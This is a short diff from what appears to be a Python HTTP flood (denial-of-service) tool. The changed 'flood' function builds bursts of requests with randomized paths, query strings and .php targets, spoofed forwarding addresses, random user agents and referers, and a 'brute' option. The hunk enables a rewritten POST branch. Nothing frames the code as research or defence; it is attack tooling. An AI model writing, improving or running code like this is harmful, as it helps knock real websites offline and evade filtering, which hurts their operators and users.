@@ -325,8 +325,8 @@ def flood(x):
                 for _ in range(100):
                     http = attack_type + " " + path + "?" + random.choice(string) + "=" + str(random.randint(1,65535))
                     http2 = "&"+random.choice(string)+"?="+str(random.randint(1,65535))
-                    #if attack_type =="POST":
-                    #    http = attack_type + " / HTTP/1.1\r\nHost: " + host + "\r\n"
+                    if attack_type =="POST":
+                        http = "POST " + path + random.choice(string) + ".php?" + random.choice(string) + "=" + str(random.randint(1,65535))
                     request = http + http2 + verHost + connection + accept + fake_addr + useragent + referer + content + length
                     if brute =="ON":
                         request = http + verHost + connection + fake_addr + accept + content + length
